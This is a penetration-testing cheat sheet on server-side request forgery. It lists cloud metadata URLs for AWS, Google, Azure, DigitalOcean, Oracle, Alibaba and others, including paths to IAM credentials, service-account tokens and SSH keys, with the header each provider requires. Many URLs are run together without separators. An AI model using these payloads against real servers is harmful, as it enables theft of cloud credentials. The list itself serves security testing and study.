# ****SSRF****

Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to trick a server-side application into making HTTP requests to an arbitrary domain of the attacker's choosing.

In typical SSRF examples, the attacker can cause the server to establish a connection to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems.

**What can we do?**

Read files from the server (file:///, dict://, ftp://, gopher://..);

Scan server ports and services;

If it is running in the cloud, we can try reading the metadata;

**Metadata**

Amazon AWS:

http://169.254.169.254/latest/meta-data/http://169.254.169.254/latest/user-data/http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HEREhttp://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance

Example : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/

Google:

http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/tokenhttp://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json

## AWS

from http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories

http://169.254.169.254/latest/user-datahttp://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/ami-idhttp://169.254.169.254/latest/meta-data/reservation-idhttp://169.254.169.254/latest/meta-data/hostnamehttp://169.254.169.254/latest/meta-data/public-keys/0/openssh-key[http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key](http://169.254.169.254/latest/meta-data/public-keys/%5BID%5D/openssh-key)

AWS - Dirs

http://169.254.169.254/http://169.254.169.254/latest/meta-data/http://169.254.169.254/latest/meta-data/public-keys/

## 

Google Cloud

# https://cloud.google.com/compute/docs/metadata

Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

http://169.254.169.254/computeMetadata/v1/http://metadata.google.internal/computeMetadata/v1/http://metadata/computeMetadata/v1/http://metadata.google.internal/computeMetadata/v1/instance/hostnamehttp://metadata.google.internal/computeMetadata/v1/instance/idhttp://metadata.google.internal/computeMetadata/v1/project/project-id

Google allows recursive pulls

http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true

## Google

Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

http://metadata.google.internal/computeMetadata/v1beta1/

Digital Ocean

# https://developers.digitalocean.com/documentation/metadata/

http://169.254.169.254/metadata/v1.jsonhttp://169.254.169.254/metadata/v1/http://169.254.169.254/metadata/v1/idhttp://169.254.169.254/metadata/v1/user-datahttp://169.254.169.254/metadata/v1/hostnamehttp://169.254.169.254/metadata/v1/regionhttp://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

## Packetcloud

https://metadata.packet.net/userdata

## Azure

Limited, maybe more exist?

https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/

http://169.254.169.254/metadata/v1/maintenance

Update Apr 2017, Azure has more support; requires the header "Metadata: true"

https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service

http://169.254.169.254/metadata/instance?api-version=2017-04-02http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

OpenStack/RackSpace

(header required? unknown)

http://169.254.169.254/openstack

HP Helion

(header required? unknown)

http://169.254.169.254/2009-04-04/meta-data/

## Oracle Cloud

http://192.0.0.192/latest/http://192.0.0.192/latest/user-data/http://192.0.0.192/latest/meta-data/http://192.0.0.192/latest/attributes/

## Alibaba

http://100.100.100.200/latest/meta-data/http://100.100.100.200/latest/meta-data/instance-idhttp://100.100.100.200/latest/meta-data/image-id

More Info

https://n3t-hunt3r.gitbook.io/pentest-book/web-application-pentesting/ssrf-less-than-server-side-request-forgery-greater-than

25 SSRF Reports

https://corneacristian.medium.com/top-25-server-side-request-forgery-ssrf-bug-bounty-reports-136928356eca